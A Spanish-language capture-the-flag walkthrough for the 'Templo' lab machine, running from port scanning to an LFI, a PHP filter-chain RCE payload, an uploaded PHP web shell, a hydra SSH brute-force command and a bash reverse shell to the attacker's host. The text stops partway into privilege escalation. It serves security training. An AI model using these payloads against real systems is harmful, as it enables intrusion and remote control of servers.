- Tags: #LXD
# Writeup Template: Maquina `[ Templo ]`
- **Enumeración de servicios**: Identificación de los servicios que corren en los puertos abiertos, incluyendo versiones.
- **Escaneo de puertos TCP**: Detección de puertos abiertos en la máquina objetivo mediante escaneo TCP.
- **Fuzzing de rutas web**: Ataque de fuerza bruta sobre rutas de la web para descubrir archivos o directorios.
- El grupo `lxd` permite a usuarios normales crear contenedores privilegiados y modificar el filesystem del host, llevando a **escalada de privilegios a root**.

- Tags: #Templo
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
192.168.100.29
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.29 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.29
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.29 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.29 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 192.168.100.29 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://192.168.100.29
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
 whatweb http://192.168.100.29/
http://192.168.100.29/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[192.168.100.29], JQuery, Lightbox, Script, Title[RODGAR]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 192.168.100.29
```

Reporte:
```bash
/css/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
/images/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
/js/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```

### Descubrimiento de Archivos y Rutas
```bash
gobuster dir -u 192.168.100.29/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 20869]
/images               (Status: 301) [Size: 317] [--> http://192.168.100.29/images/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.100.29/css/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.100.29/js/]
/wow                  (Status: 301) [Size: 314] [--> http://192.168.100.29/wow/]
/fonts                (Status: 301) [Size: 316] [--> http://192.168.100.29/fonts/]
```

En esta ruta si revisamos:
```bash
http://192.168.100.29/wow/clue.txt
```

Tenemos lo siguiente, que hace referencia al directorio op:
```bash
Vamos al /opt
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemos esta url que nos permite subir archivos y si no esta sanitizada podemos aprovecharnos para subir un archivo malicioso que nos permite realizar una llamada a nivel de sistema para ejecutar comandos:
```bash
http://192.168.100.29/NAMARI/
```

Antes de probar subir un archivo malicioso, tenemos que realizar fuzzing para ver si encontramos la ruta donde se almacenan los archivos que subimos:
```bash
gobuster dir -u http://192.168.100.29/NAMARI/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

Logrando encontrar la ruta en donde se cargan los archivos subidos:
```bash
/uploads              (Status: 301) [Size: 325] [--> http://192.168.100.29/NAMARI/uploads/]
```

Ahora creamos un archivo malicioso en php para ver si podemos subirlo
```php
# shell.php

<?php
  system($_GET["cmd"]);
?>
```

Logramos subir el archivo, y se encuentra en la siguiente ruta:
```bash
http://192.168.100.29/NAMARI/uploads/
```

Pero si accedemos no podemos verlo, Asi que tenemos que ver otra manera de poder ejecutar comandos
Despues tenemos una seccion donde podemos escribir el nombre de un archivo a incluir, si pobramos **testing** para ver como es que reacciona la web
Vemos que en la url esta reflejado nuestro input
```bash
http://192.168.100.29/NAMARI/index.php?page=testing
```

### Ejecucion del Ataque
Ahora sabiendo esto probaremos si es que es vulnerable a **LFI**
```bash
# Comandos para explotación
http://192.168.100.29/NAMARI/index.php?page=/etc/passwd
```

Logramos ver archivos, del servidor
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
rodgar:x:1000:1000:rodgar:/home/rodgar:/bin/bash
```

Ahora que tenemos un usuario valido realizamos un ataque de fuerza bruta por **ssh**, en caso de que tenga una password debil, lograremos ganar acceso por **ssh**
```bash
hydra -l rodgar -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://192.168.100.29
```

Si realizamos fuzzing para ver a que archivos tenemos acceso,
```bash
wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://192.168.100.29/NAMARI/index.php?page=FUZZ" --hh=2993,4776
```

Tenemos el siguiente reporte:
```bash
"/etc/crontab"                                 
"/etc/apt/sources.list"                        
"/etc/apache2/apache2.conf"                    
"/etc/fstab"                                   
"/etc/group"                                   
"/etc/hosts.allow"                             
"/etc/hosts"                                   
"../../../../../../../../../../../../etc/hosts"
"/etc/hosts.deny"                              
"/etc/issue"                                   
"/etc/init.d/apache2"                          
"/etc/nsswitch.conf"                           
"/etc/netconfig"                               
"/etc/rpc"                                     
"/etc/vsftpd.conf"                             
"/etc/ssh/sshd_config"                         
"/etc/resolv.conf"                             
"/proc/net/route"                              
"/proc/version"                                
"/proc/self/cmdline"                           
"/proc/self/status"                            
"/proc/partitions"                             
"/proc/net/dev"                                
"/proc/net/arp"                                
"/proc/meminfo"                                
"/proc/mounts"                                 
"/proc/cpuinfo"                                
"/proc/interrupts"                             
"/proc/loadavg"                                
"/proc/net/tcp"                                
"/var/log/lastlog"                             
"/var/www/html/.htaccess"                      
"/var/run/utmp"                                
"/var/log/wtmp"                                
```

Ahora lo que tenemos es que ver la manera de ejecutar comandos:
Para eso usamos el siguiente repositorio:
```bash
git clone https://github.com/synacktiv/php_filter_chain_generator.git --depth=1
```

Este nos permite ejecutar un comando de la siguiente manera:
```bash
python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'
```

Ahora el **payload** que nos da lo ejecutaremos en el input de incluir archivos:
```bash
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

En la respuesta del servidor, vemos lo siguiente:
```bash
www-data � P�������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@
```

de igual manera podemos descargarnos el codigo fuente del **index.php** para ver desde el codigo fuente donde es que se estan almacenando los archivos que subimos
```bash
192.168.100.29/NAMARI/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

Ahora lo decodificamos y al mismo tiempo lo almacenamos en un archivo **index.php**
```bash
echo -n "PD9waHAKLy8gTWFuZWpvIGRlIHN1YmlkYSBkZSBhcmNoaXZvcwppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJykgewogICAgJHRhcmdldF9kaXIgPSAidXBsb2Fkcy8iOwoKICAgIC8vIE9idGllbmUgZWwgbm9tYnJlIG9yaWdpbmFsIGRlbCBhcmNoaXZvIHkgc3UgZXh0ZW5zacOzbgogICAgJG9yaWdpbmFsX25hbWUgPSBiYXNlbmFtZSgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXVsibmFtZSJdKTsKICAgICRmaWxlX2V4dGVuc2lvbiA9IHBhdGhpbmZvKCRvcmlnaW5hbF9uYW1lLCBQQVRISU5GT19FWFRFTlNJT04pOwoKCiAgICAkZmlsZV9uYW1lX3dpdGhvdXRfZXh0ZW5zaW9uID0gcGF0aGluZm8oJG9yaWdpbmFsX25hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKICAgICRyb3QxM19lbmNvZGVkX25hbWUgPSBzdHJfcm90MTMoJGZpbGVfbmFtZV93aXRob3V0X2V4dGVuc2lvbik7CiAgICAkbmV3X25hbWUgPSAkcm90MTNfZW5jb2RlZF9uYW1lIC4gJy4nIC4gJGZpbGVfZXh0ZW5zaW9uOwoKICAgIC8vIENyZWEgbGEgcnV0YSBjb21wbGV0YSBwYXJhIGVsIG51ZXZvIGFyY2hpdm8KICAgICR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJG5ld19uYW1lOwoKICAgIC8vIE11ZXZlIGVsIGFyY2hpdm8gc3ViaWRvIGFsIGRpcmVjdG9yaW8gb2JqZXRpdm8gY29uIGVsIG51ZXZvIG5vbWJyZQogICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXVsidG1wX25hbWUiXSwgJHRhcmdldF9maWxlKSkgewogICAgICAgIC8vIE1lbnNhamUgZ2Vuw6lyaWNvIHNpbiBtb3N0cmFyIGVsIG5vbWJyZSBkZWwgYXJjaGl2bwogICAgICAgICRtZXNzYWdlID0gIkVsIGFyY2hpdm8gaGEgc2lkbyBzdWJpZG8gZXhpdG9zYW1lbnRlLiI7CiAgICAgICAgJG1lc3NhZ2VfdHlwZSA9ICJzdWNjZXNzIjsKICAgIH0gZWxzZSB7CiAgICAgICAgJG1lc3NhZ2UgPSAiSHVibyB1biBlcnJvciBzdWJpZW5kbyB0dSBhcmNoaXZvLiI7CiAgICAgICAgJG1lc3NhZ2VfdHlwZSA9ICJlcnJvciI7CiAgICB9Cn0KCgppZiAoaXNzZXQoJF9HRVRbJ3BhZ2UnXSkpIHsKICAgICRmaWxlID0gJF9HRVRbJ3BhZ2UnXTsKICAgIGluY2x1ZGUoJGZpbGUpOwp9Cj8+Cgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZXMiPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDx0aXRsZT5TdWJpZGEgZGUgQXJjaGl2b3MgeSBMRkk8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBmb250LWZhbWlseTogQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDEwMHZoOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiB1cmwoJ3VwLmpwZycpIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyIGZpeGVkOwogICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOwogICAgICAgIH0KCiAgICAgICAgaDIgewogICAgICAgICAgICBjb2xvcjogIzMzMzsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjgpOwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgfQoKICAgICAgICBmb3JtIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjgpOwogICAgICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgMCAxMHB4IHJnYmEoMCwgMCwgMCwgMC4xKTsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgICAgICAgd2lkdGg6IDgwJTsgLyogQW5jaG8gZGUgbG9zIGZvcm11bGFyaW9zIGFsIDgwJSBkZSBsYSBwYW50YWxsYSAqLwogICAgICAgICAgICBtYXgtd2lkdGg6IDYwMHB4OyAvKiBBbmNobyBtw6F4aW1vIGRlIGxvcyBmb3JtdWxhcmlvcyAqLwogICAgICAgIH0KCiAgICAgICAgbGFiZWwgewogICAgICAgICAgICBkaXNwbGF5OiBibG9jazsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogOHB4OwogICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgICB9CgogICAgICAgIGlucHV0W3R5cGU9ImZpbGUiXSwKICAgICAgICBpbnB1dFt0eXBlPSJ0ZXh0Il0gewogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgcGFkZGluZzogOHB4OwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjY2NjOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7CiAgICAgICAgfQoKICAgICAgICBpbnB1dFt0eXBlPSJzdWJtaXQiXSB7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDdiZmY7CiAgICAgICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICAgICAgcGFkZGluZzogMTBweCAxNXB4OwogICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICB9CgogICAgICAgIGlucHV0W3R5cGU9InN1Ym1pdCJdOmhvdmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzAwNTZiMzsKICAgICAgICB9CgogICAgICAgIC5tZXNzYWdlIHsKICAgICAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgIHdpZHRoOiA4MCU7IC8qIEFuY2hvIGRlbCBtZW5zYWplIGFsIDgwJSBkZSBsYSBwYW50YWxsYSAqLwogICAgICAgICAgICBtYXgtd2lkdGg6IDYwMHB4OyAvKiBBbmNobyBtw6F4aW1vIGRlbCBtZW5zYWplICovCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC44KTsKICAgICAgICB9CgogICAgICAgIC5zdWNjZXNzIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2Q0ZWRkYTsKICAgICAgICAgICAgY29sb3I6ICMxNTU3MjQ7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNjM2U2Y2I7CiAgICAgICAgfQoKICAgICAgICAuZXJyb3IgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjhkN2RhOwogICAgICAgICAgICBjb2xvcjogIzcyMWMyNDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgI2Y1YzZjYjsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPD9waHAgaWYgKGlzc2V0KCRtZXNzYWdlKSk6ID8+CiAgICAgICAgPGRpdiBjbGFzcz0ibWVzc2FnZSA8P3BocCBlY2hvICRtZXNzYWdlX3R5cGU7ID8+Ij4KICAgICAgICAgICAgPD9waHAgZWNobyAkbWVzc2FnZTsgPz4KICAgICAgICA8L2Rpdj4KICAgIDw/cGhwIGVuZGlmOyA/PgoKICAgIDxoMj5TdWJpciBBcmNoaXZvPC9oMj4KICAgIDxmb3JtIGFjdGlvbj0iaW5kZXgucGhwIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgICAgIDxsYWJlbCBmb3I9ImZpbGVUb1VwbG9hZCI+U2VsZWNjaW9uYSB1biBhcmNoaXZvIHBhcmEgc3ViaXI6PC9sYWJlbD4KICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZVRvVXBsb2FkIiBpZD0iZmlsZVRvVXBsb2FkIj4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3ViaXIgQXJjaGl2byIgbmFtZT0ic3VibWl0Ij4KICAgIDwvZm9ybT4KCiAgICA8aDI+SW5jbHVpciBBcmNoaXZvPC9oMj4KICAgIDxmb3JtIGFjdGlvbj0iaW5kZXgucGhwIiBtZXRob2Q9ImdldCI+CiAgICAgICAgPGxhYmVsIGZvcj0icGFnZSI+QXJjaGl2byBhIGluY2x1aXI6PC9sYWJlbD4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9InBhZ2UiIG5hbWU9InBhZ2UiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJJbmNsdWlyIj4KICAgIDwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cg==" | base64 -d > index.php
```

Ahora si miramos el contenido tenemos la funcion que almacena nuestro archivo:
```bash
<?php
// Manejo de subida de archivos
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target_dir = "uploads/";

    // Obtiene el nombre original del archivo y su extensión
    $original_name = basename($_FILES["fileToUpload"]["name"]);
    $file_extension = pathinfo($original_name, PATHINFO_EXTENSION);


    $file_name_without_extension = pathinfo($original_name, PATHINFO_FILENAME);
    $rot13_encoded_name = str_rot13($file_name_without_extension);
    $new_name = $rot13_encoded_name . '.' . $file_extension;

    // Crea la ruta completa para el nuevo archivo
    $target_file = $target_dir . $new_name;

    // Mueve el archivo subido al directorio objetivo con el nuevo nombre
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        // Mensaje genérico sin mostrar el nombre del archivo
        $message = "El archivo ha sido subido exitosamente.";
        $message_type = "success";
    } else {
        $message = "Hubo un error subiendo tu archivo.";
        $message_type = "error";
    }
}


if (isset($_GET['page'])) {
    $file = $_GET['page'];
    include($file);
}
?>
```

Vemos que esta aplicando **root13** para el nombre de nuestro archivo de **php**
Asi que para encontrar nuestro archivo usaremos este script en python3 que se encarga de revertir el **cifradoCesar**
```python
#!/usr/bin/env python3
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description="Herramienta para cifrar/descifrar usando Cifrado César")
    parser.add_argument("-t", "--text", required=True, dest="texto", help="Texto a procesar")
    parser.add_argument("-k", "--key", type=int, default=3, help="Clave de desplazamiento (por defecto 3)")
    parser.add_argument("-d", "--descifrar", action="store_true", help="Descifrar en lugar de cifrar")
    
    return parser.parse_args()

def cesar(texto, k, descifrar=False):
    resultado = []
    if descifrar:
        k = -k  # Invertimos el desplazamiento para descifrar
    
    for letra in texto:
        if letra.isalpha():
            base = 'A' if letra.isupper() else 'a'
            nueva_letra = chr((ord(letra) - ord(base) + k) % 26 + ord(base))
            resultado.append(nueva_letra)
        else:
            resultado.append(letra)

    return ''.join(resultado)

def main():
    args = get_arguments()
    
    # Procesar el texto que le pasemos como argumento
    resultado = cesar(
        texto=args.texto,
        k=args.key,
        descifrar=args.descifrar
    )
    
    print(resultado)

if __name__ == '__main__':
    main()
```

**Sintxis**
```bash
python3 desencriptador.py -t "TEXTO" [opciones]
```

**Parametros**
 -t, --text TEXT     Texto a procesar (requerido)
  -k, --key KEY       Clave de desplazamiento (por defecto: 3)
  -d, --descifrar     Activar modo descifrado (por defecto: cifrar)

Ahora lo ejecutamos de la siguiente manera:
ponemos **shell** ya que asi se llama nuestro archivo malicioso, 
y ponemos **k13** ya que es cifrado **root13**
```bash
cesarDecrypt.py -t 'shell' -k 13
```

Tenemos el siguiente cifrado:
```bash
# resultado
furyy
```

Ahora que sabemos esto, procedemos a ir a la siguiete ruta, e intentar ejecutar comandos:
```bash
http://192.168.100.29/NAMARI/uploads/furyy.php?cmd=whoami
```

Tenemos **RCE** de maenra exitosa:
```bash
www-data
```
### Intrusion
Ahora tenemos que ganar acceso al objetivo, Asi que nos ponemos Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
192.168.100.29/NAMARI/uploads/furyy.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/192.168.100.24/443 <%261'
```

---

## Escalada de Privilegios

###### Usuario `[ www-data ]`:
Si revisamo la ruta **/opt** tenemos lo siguiente:
```bash
/opt/.XXX/backup.zip
```

Si revisamos si existe python
```bash
which python3
/usr/bin/python3
```

Ahora sabiendo esto montamos un servidor desde la maquina victima para traernos ese comprimido
```bash
-rw-r--r-- 1 root   root    378 Aug  3  2024 backup.zip
